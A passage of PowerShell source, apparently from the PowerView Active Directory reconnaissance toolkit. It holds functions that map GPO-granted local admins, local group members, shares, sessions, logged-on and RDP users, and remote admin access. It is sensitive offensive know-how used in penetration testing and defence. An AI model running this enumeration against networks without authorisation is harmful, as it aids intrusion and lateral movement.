                    $GPOLocation | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocation | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocation | Add-Member Noteproperty 'ComputerName' $OUComputers
                    $GPOLocation.PSObject.TypeNames.Add('PowerView.GPOLocalGroup')
                    $GPOLocation
                }
            }
        }

        
        Get-NetSite -Domain $Domain -DomainController $DomainController -GUID $GPOguid -PageSize $PageSize -FullData | ForEach-Object {

            ForEach ($TargetSid in $TargetObjectSIDs) {
                $Object = Get-ADObject -SID $TargetSid -Domain $Domain -DomainController $DomainController -Credential $Credential -PageSize $PageSize

                $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                $AppliedSite = New-Object PSObject
                $AppliedSite | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                $AppliedSite | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                $AppliedSite | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                $AppliedSite | Add-Member Noteproperty 'IsGroup' $IsGroup
                $AppliedSite | Add-Member Noteproperty 'Domain' $Domain
                $AppliedSite | Add-Member Noteproperty 'GPODisplayName' $GPOname
                $AppliedSite | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                $AppliedSite | Add-Member Noteproperty 'GPOPath' $GPOPath
                $AppliedSite | Add-Member Noteproperty 'GPOType' $GPOType
                $AppliedSite | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $AppliedSite | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                $AppliedSite.PSObject.TypeNames.Add('PowerView.GPOLocalGroup')
                $AppliedSite
            }
        }
    }
}


function Find-GPOComputerAdmin {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = 'Administrators',

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
    
        if(!$ComputerName -and !$OUName) {
            Throw "-ComputerName or -OUName must be provided"
        }

        $GPOGroups = @()

        if($ComputerName) {
            $Computers = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

            if(!$Computers) {
                throw "Computer $ComputerName in domain '$Domain' not found! Try a fully qualified host name"
            }
            
            $TargetOUs = @()
            ForEach($Computer in $Computers) {
                
                $DN = $Computer.distinguishedname

                $TargetOUs += $DN.split(",") | ForEach-Object {
                    if($_.startswith("OU=")) {
                        $DN.substring($DN.indexof($_))
                    }
                }
            }

            
            $ComputerSite = (Get-SiteName -ComputerName $ComputerName).SiteName
            if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                $GPOGroups += Get-NetSite -SiteName $ComputerSite -FullData | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split("][") | ForEach-Object {
                            if ($_.startswith("LDAP")) {
                                $_.split(";")[0]
                            }
                        }
                    }
                } | ForEach-Object {
                    $GPOGroupArgs =  @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ResolveMemberSIDs' = $True
                        'UsePSDrive' = $UsePSDrive
                        'PageSize' = $PageSize
                    }

                    
                    Get-NetGPOGroup @GPOGroupArgs
                }
            }
        }
        else {
            $TargetOUs = @($OUName)
        }

        Write-Verbose "Target OUs: $TargetOUs"

        $TargetOUs | Where-Object {$_} | ForEach-Object {

            $GPOLinks = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | ForEach-Object { 
                
                if($_.gplink) {
                    $_.gplink.split("][") | ForEach-Object {
                        if ($_.startswith("LDAP")) {
                            $_.split(";")[0]
                        }
                    }
                }
            }

            $GPOGroupArgs =  @{
                'Domain' = $Domain
                'DomainController' = $DomainController
                'UsePSDrive' = $UsePSDrive
                'ResolveMemberSIDs' = $True
                'PageSize' = $PageSize
            }

            
            $GPOGroups += Get-NetGPOGroup @GPOGroupArgs | ForEach-Object {
                ForEach($GPOLink in $GPOLinks) {
                    $Name = $_.GPOName
                    if($GPOLink -like "*$Name*") {
                        $_
                    }
                }
            }
        }

        
        $GPOgroups | Sort-Object -Property GPOName -Unique | ForEach-Object {
            $GPOGroup = $_

            if($GPOGroup.GroupMembers) {
                $GPOMembers = $GPOGroup.GroupMembers
            }
            else {
                $GPOMembers = $GPOGroup.GroupSID
            }

            $GPOMembers | ForEach-Object {
                
                $Object = Get-ADObject -Domain $Domain -DomainController $DomainController -PageSize $PageSize -SID $_

                $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                $GPOComputerAdmin = New-Object PSObject
                $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_
                $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $IsGroup
                $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                $GPOComputerAdmin | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                $GPOComputerAdmin | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                $GPOComputerAdmin

                
                if($Recurse -and $GPOComputerAdmin.isGroup) {

                    Get-NetGroupMember -Domain $Domain -DomainController $DomainController -SID $_ -FullData -Recurse -PageSize $PageSize | ForEach-Object {

                        $MemberDN = $_.distinguishedName

                        
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                        $MemberIsGroup = @('268435456','268435457','536870912','536870913') -contains $_.samaccounttype

                        if ($_.samAccountName) {
                            
                            $MemberName = $_.samAccountName
                        }
                        else {
                            
                            try {
                                $MemberName = Convert-SidToName $_.cn
                            }
                            catch {
                                
                                $MemberName = $_.cn
                            }
                        }

                        $GPOComputerAdmin = New-Object PSObject
                        $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $MemberName
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $MemberDN
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                        $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $MemberIsGrou
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPOType' $GPOTypep
                        $GPOComputerAdmin 
                    }
                }
            }
        }
    }
}


function Get-DomainPolicy {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    if($Source -eq "Domain") {
        
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if($GPO) {
            
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }

            
            Get-GptTmpl @ParseArgs
        }

    }
    elseif($Source -eq "DC") {
        
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if($GPO) {
            
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }

            
            Get-GptTmpl @ParseArgs | ForEach-Object {
                if($ResolveSids) {
                    
                    $Policy = New-Object PSObject
                    $_.psobject.properties | ForEach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $PrivilegeRights = New-Object PSObject
                            
                            $_.Value.psobject.properties | ForEach-Object {

                                $Sids = $_.Value | ForEach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            Convert-SidToName $_ 
                                        }
                                        else {
                                            $_ | ForEach-Object { Convert-SidToName $_ }
                                        }
                                    }
                                    catch {
                                        Write-Verbose "Error resolving SID : $_"
                                    }
                                }

                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids
                            }

                            $Policy | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights
                        }
                        else {
                            $Policy | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $Policy
                }
                else { $_ }
            }
        }
    }
}











function Get-NetLocalGroup {


    [CmdletBinding(DefaultParameterSetName = 'WinNT')]
    param(
        [Parameter(ParameterSetName = 'API', Position=0, ValueFromPipeline=$True)]
        [Parameter(ParameterSetName = 'WinNT', Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String[]]
        $ComputerName = $Env:ComputerName,

        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [String]
        $GroupName = 'Administrators',

        [Parameter(ParameterSetName = 'WinNT')]
        [Switch]
        $ListGroups,

        [Parameter(ParameterSetName = 'WinNT')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API
    )

    process {

        $Servers = @()

        
        if($ComputerFile) {
            $Servers = Get-Content -Path $ComputerFile
        }
        else {
            
            $Servers += $ComputerName | Get-NameField
        }

        
        
        ForEach($Server in $Servers) {

            if($API) {
                
                
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                
                $Result = $Netapi32::NetLocalGroupGetMembers($Server, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                
                $Offset = $PtrInfo.ToInt64()

                $LocalUsers = @()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ""
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if($Result2 -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $LocalUser = New-Object PSObject
                            $LocalUser | Add-Member Noteproperty 'ComputerName' $Server
                            $LocalUser | Add-Member Noteproperty 'AccountName' $Info.lgrmi2_domainandname
                            $LocalUser | Add-Member Noteproperty 'SID' $SidString

                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $LocalUser | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $LocalUser.PSObject.TypeNames.Add('PowerView.LocalUserAPI')

                            $LocalUsers += $LocalUser
                        }
                    }

                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    
                    $MachineSid = $LocalUsers | Where-Object {$_.SID -like '*-500'}
                    $Parts = $MachineSid.SID.Split('-')
                    $MachineSid = $Parts[0..($Parts.Length -2)] -join '-'

                    $LocalUsers | ForEach-Object {
                        if($_.SID -match $MachineSid) {
                            $_ | Add-Member Noteproperty 'IsDomain' $False
                        }
                        else {
                            $_ | Add-Member Noteproperty 'IsDomain' $True
                        }
                    }
                    $LocalUsers
                }
                else {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }

            else {
                
                try {
                    if($ListGroups) {
                        
                        $Computer = [ADSI]"WinNT://$Server,computer"

                        $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                            $Group = New-Object PSObject
                            $Group | Add-Member Noteproperty 'Server' $Server
                            $Group | Add-Member Noteproperty 'Group' ($_.name[0])
                            $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                            $Group | Add-Member Noteproperty 'Description' ($_.Description[0])
                            $Group.PSObject.TypeNames.Add('PowerView.LocalGroup')
                            $Group
                        }
                    }
                    else {
                        
                        $Members = @($([ADSI]"WinNT://$Server/$GroupName,group").psbase.Invoke('Members'))

                        $Members | ForEach-Object {

                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Server

                            $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')
                            $Class = $_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null)

                            
                            $Name = Convert-ADName -ObjectName $AdsPath -InputType 'NT4' -OutputType 'Canonical'
                            $IsGroup = $Class -eq "Group"

                            if($Name) {
                                $FQDN = $Name.split("/")[0]
                                $ObjName = $AdsPath.split("/")[-1]
                                $Name = "$FQDN/$ObjName"
                                $IsDomain = $True
                            }
                            else {
                                $ObjName = $AdsPath.split("/")[-1]
                                $Name = $AdsPath
                                $IsDomain = $False
                            }

                            $Member | Add-Member Noteproperty 'AccountName' $Name
                            $Member | Add-Member Noteproperty 'IsDomain' $IsDomain
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup

                            if($IsDomain) {
                                
                                $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)
                                $Member | Add-Member Noteproperty 'Description' ""
                                $Member | Add-Member Noteproperty 'Disabled' ""

                                if($IsGroup) {
                                    $Member | Add-Member Noteproperty 'LastLogin' ""
                                }
                                else {
                                    try {
                                        $Member | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                                    }
                                    catch {
                                        $Member | Add-Member Noteproperty 'LastLogin' ""
                                    }
                                }
                                $Member | Add-Member Noteproperty 'PwdLastSet' ""
                                $Member | Add-Member Noteproperty 'PwdExpired' ""
                                $Member | Add-Member Noteproperty 'UserFlags' ""
                            }
                            else {
                                
                                $LocalUser = $([ADSI] "WinNT://$AdsPath")

                                
                                $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.objectSid.value,0)).Value)
                                $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description[0])

                                if($IsGroup) {
                                    $Member | Add-Member Noteproperty 'PwdLastSet' ""
                                    $Member | Add-Member Noteproperty 'PwdExpired' ""
                                    $Member | Add-Member Noteproperty 'UserFlags' ""
                                    $Member | Add-Member Noteproperty 'Disabled' ""
                                    $Member | Add-Member Noteproperty 'LastLogin' ""
                                }
                                else {
                                    $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
                                    $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
                                    $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
                                    
                                    $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.userFlags.value -band 2) -eq 2)
                                    try {
                                        $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
                                    }
                                    catch {
                                        $Member | Add-Member Noteproperty 'LastLogin' ""
                                    }
                                }
                            }
                            $Member.PSObject.TypeNames.Add('PowerView.LocalUser')
                            $Member

                            
                            
                            if($Recurse -and $IsGroup) {
                                if($IsDomain) {
                                  $FQDN = $Name.split("/")[0]
                                  $GroupName = $Name.split("/")[1].trim()

                                  Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {

                                      $Member = New-Object PSObject
                                      $Member | Add-Member Noteproperty 'ComputerName' "$FQDN/$($_.GroupName)"

                                      $MemberDN = $_.distinguishedName
                                      
                                      $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                                      $MemberIsGroup = @('268435456','268435457','536870912','536870913') -contains $_.samaccounttype

                                      if ($_.samAccountName) {
                                          
                                          $MemberName = $_.samAccountName
                                      }
                                      else {
                                          try {
                                              
                                              try {
                                                  $MemberName = Convert-SidToName $_.cn
                                              }
                                              catch {
                                                  
                                                  $MemberName = $_.cn
                                              }
                                          }
                                          catch {
                                              Write-Debug "Error resolving SID : $_"
                                          }
                                      }

                                      $Member | Add-Member Noteproperty 'AccountName' "$MemberDomain/$MemberName"
                                      $Member | Add-Member Noteproperty 'SID' $_.objectsid
                                      $Member | Add-Member Noteproperty 'Description' $_.description
                                      $Member | Add-Member Noteproperty 'Disabled' $False
                                      $Member | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                                      $Member | Add-Member Noteproperty 'IsDomain' $True
                                      $Member | Add-Member Noteproperty 'LastLogin' ''
                                      $Member | Add-Member Noteproperty 'PwdLastSet' $_.pwdLastSet
                                      $Member | Add-Member Noteproperty 'PwdExpired' ''
                                      $Member | Add-Member Noteproperty 'UserFlags' $_.userAccountControl
                                      $Member.PSObject.TypeNames.Add('PowerView.LocalUser')
                                      $Member
                                  }
                              } else {
                                Get-NetLocalGroup -ComputerName $Server -GroupName $ObjName -Recurse
                              }
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[!] Error: $_"
                }
            }
        }
    }
}

filter Get-NetShare {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $QueryLevel = 1
    $PtrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    
    $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

    
    $Offset = $PtrInfo.ToInt64()

    
    if (($Result -eq 0) -and ($Offset -gt 0)) {

        
        $Increment = $SHARE_INFO_1::GetSize()

        
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
            $Info = $NewIntPtr -as $SHARE_INFO_1

            
            $Shares = $Info | Select-Object *
            $Shares | Add-Member Noteproperty 'ComputerName' $Computer
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment
            $Shares
        }

        
        $Null = $Netapi32::NetApiBufferFree($PtrInfo)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}


filter Get-NetLoggedon {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $QueryLevel = 1
    $PtrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    
    $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

    
    $Offset = $PtrInfo.ToInt64()

    
    if (($Result -eq 0) -and ($Offset -gt 0)) {

        
        $Increment = $WKSTA_USER_INFO_1::GetSize()

        
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
            $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

            
            $LoggedOn = $Info | Select-Object *
            $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment
            $LoggedOn
        }

        
        $Null = $Netapi32::NetApiBufferFree($PtrInfo)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}


filter Get-NetSession {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [String]
        $UserName = ''
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $QueryLevel = 10
    $PtrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    
    $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

    
    $Offset = $PtrInfo.ToInt64()

    
    if (($Result -eq 0) -and ($Offset -gt 0)) {

        
        $Increment = $SESSION_INFO_10::GetSize()

        
        for ($i = 0; ($i -lt $EntriesRead); $i++) {
            
            $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
            $Info = $NewIntPtr -as $SESSION_INFO_10

            
            $Sessions = $Info | Select-Object *
            $Sessions | Add-Member Noteproperty 'ComputerName' $Computer
            $Offset = $NewIntPtr.ToInt64()
            $Offset += $Increment
            $Sessions
        }
        
        $Null = $Netapi32::NetApiBufferFree($PtrInfo)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
    }
}


filter Get-LoggedOnLocal {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    
    $ComputerName = Get-NameField -Object $ComputerName

    try {
        
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

        
        $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
            $UserName = Convert-SidToName $_

            $Parts = $UserName.Split('\')
            $UserDomain = $Null
            $UserName = $Parts[-1]
            if ($Parts.Length -eq 2) {
                $UserDomain = $Parts[0]
            }

            $LocalLoggedOnUser = New-Object PSObject
            $LocalLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
            $LocalLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
            $LocalLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
            $LocalLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
            $LocalLoggedOnUser
        }
    }
    catch {
        Write-Verbose "Error opening remote registry on '$ComputerName'"
    }
}


filter Get-NetRDPSession {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

    
    if ($Handle -ne 0) {

        
        $ppSessionInfo = [IntPtr]::Zero
        $pCount = 0
        
        
        $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        
        $Offset = $ppSessionInfo.ToInt64()

        if (($Result -ne 0) -and ($Offset -gt 0)) {

            
            $Increment = $WTS_SESSION_INFO_1::GetSize()

            
            for ($i = 0; ($i -lt $pCount); $i++) {
 
                
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                $RDPSession = New-Object PSObject

                if ($Info.pHostName) {
                    $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                }
                else {
                    
                    $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                }

                $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                    
                    $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                }
                else {
                    $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                }

                $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                $RDPSession | Add-Member Noteproperty 'State' $Info.State

                $ppBuffer = [IntPtr]::Zero
                $pBytesReturned = 0

                
                
                $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                }
                else {
                    $Offset2 = $ppBuffer.ToInt64()
                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                    $SourceIP = $Info2.Address       
                    if($SourceIP[2] -ne 0) {
                        $SourceIP = [String]$SourceIP[2]+"."+[String]$SourceIP[3]+"."+[String]$SourceIP[4]+"."+[String]$SourceIP[5]
                    }
                    else {
                        $SourceIP = $Null
                    }

                    $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                    $RDPSession

                    
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                    $Offset += $Increment
                }
            }
            
            $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
        }
        else {
            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
        
        $Null = $Wtsapi32::WTSCloseServer($Handle)
    }
    else {
        Write-Verbose "Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
    }
}


filter Invoke-CheckLocalAdminAccess {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost'
    )

    
    $Computer = $ComputerName | Get-NameField

    
    
    $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    Write-Verbose "Invoke-CheckLocalAdminAccess handle: $Handle"

    $IsAdmin = New-Object PSObject
    $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

    
    if ($Handle -ne 0) {
        $Null = $Advapi32::CloseServiceHandle($Handle)
        $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
    }

    $IsAdmin
}


filter Get-SiteName {

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = $Env:ComputerName
    )

    
    $Computer = $ComputerName | Get-NameField

    
    if($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
        $IPAddress = $Computer
        $Computer = [System.Net.Dns]::GetHostByAddress($Computer)
    }
    else {
        $IPAddress = @(Get-IPAddress -ComputerName $Computer)[0].IPAddress
    }

    $PtrInfo = [IntPtr]::Zero

    $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

    $ComputerSite = New-Object PSObject
    $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
    $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

    if ($Result -eq 0) {
        $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
        $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
    }
    else {
        $ErrorMessage = "Error: $(([ComponentModel.Win32Exception] $Result).Message)"
        $ComputerSite | Add-Member Noteproperty 'SiteName' $ErrorMessage
    }

    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

    $ComputerSite
}


filter Get-LastLoggedOn {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        $Credential
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $HKLM = 2147483650

    
    try {

        if($Credential) {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -ErrorAction SilentlyContinue
        }

        $Key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
        $Value = "LastLoggedOnUser"
        $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

        $LastLoggedOn = New-Object PSObject
        $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
        $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
        $LastLoggedOn
    }
    catch {
        Write-Warning "[!] Error opening remote registry on $Computer. Remote registry likely not enabled."
    }
}


filter Get-CachedRDPConnection {


    [CmdletBinding()]
    param(
